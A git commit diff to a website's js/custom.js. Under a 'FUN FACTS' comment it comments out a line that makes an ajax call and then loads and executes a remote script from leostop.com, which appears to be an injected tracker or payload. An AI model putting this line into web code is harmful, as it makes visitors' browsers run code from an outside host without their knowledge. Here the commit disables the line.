1b7aabfeaae6425c8c52a12cebb90eae48cb4a12
shubham1010 <shubhamjagdhane1010@gmail.com>
2020-09-13 10:30:04 +0530

    added faculties and cells pages

--- js/custom.js
+++ js/custom.js
@@ -104,7 +104,7 @@
   });
 
   // FUN FACTS   
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  //function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
   function count($this) {
